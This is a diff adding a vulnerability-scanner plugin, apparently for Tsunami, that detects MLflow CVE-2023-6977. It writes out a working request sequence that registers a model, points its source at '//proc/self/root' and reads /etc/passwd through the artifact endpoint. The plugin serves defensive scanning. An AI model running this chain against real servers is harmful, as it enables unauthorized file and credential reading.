@@ -1,0 +1,128 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "MLFlow_CVE_2023_6977"
+  author: "hh-hunter, frkngksl"
+  version: "0.3"
+}
+
+finding: {
+  main_id: {
+    publisher: "GOOGLE"
+    value: "MLFLOW_LFI_RFI"
+  }
+  title: "CVE-2023-6977 MLflow LFI/RFI"
+  description:
+    "mlflow is a platform to streamline machine learning development, including tracking"
+    " experiments, packaging code into reproducible runs, and sharing and deploying models."
+    " Affected versions of this package are vulnerable to Improper Access Control which"
+    " enables malicious actors to download arbitrary files unrelated to MLflow from the"
+    " host server, including any files stored in remote locations to which the host server"
+    " has access.This vulnerability can read arbitrary files. Since MLflow usually"
+    " configures s3 storage, it means that AWS account information can also be obtained,"
+    " and information such as local ssh private keys can also be read, resulting in RCE."
+    " The vulnerability detected here is CVE-2023-6977 which is a bypass for both"
+    " CVE-2023-1177 and CVE-2023-2780. Hence, this plugin encompasses them."
+  recommendation: "1.Update to the version 2.10.0 or above\n2.Add authentication to MLflow server\n"
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2023-6977"
+  }
+}
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "create_model"
+  http_request: {
+    method: POST
+    uri: "ajax-api/2.0/mlflow/registered-models/create"
+    headers: [
+      { name: "Content-Type" value: "application/json" }
+    ]
+    data: "{\"name\":\"{{ model_name }}\"}"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: {} contains: "{{ model_name }}" }
+        ]
+      }
+    }
+  }
+  cleanup_actions: "clean_model"
+}
+
+actions: {
+  name: "update_model"
+  http_request: {
+    method: POST
+    uri: "ajax-api/2.0/mlflow/model-versions/create"
+    headers: [
+      { name: "Content-Type" value: "application/json" }
+    ]
+    data: "{\"name\":\"{{ model_name }}\",\"source\":\"//proc/self/root\"}"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: {} contains: "{{ model_name }}" }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "read_file"
+  http_request: {
+    method: GET
+    uri: "model-versions/get-artifact?path=etc/passwd&name={{ model_name }}&version=1"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: {} contains: "root:x:0:0:root" }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "clean_model"
+  http_request: {
+    method: DELETE
+    uri: "ajax-api/2.0/mlflow/registered-models/delete"
+    headers: [
+      { name: "Content-Type" value: "application/json" }
+    ]
+    data: "{\"name\":\"{{ model_name }}\"}"
+    response: {
+      http_status: 200
+    }
+  }
+}
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  variables: [
+    { name: "model_name" value: "Tsunami-Test{{ T_UTL_CURRENT_TIMESTAMP_MS }}" }
+  ]
+  actions: [
+    "create_model",
+    "update_model",
+    "read_file"
+  ]
+}
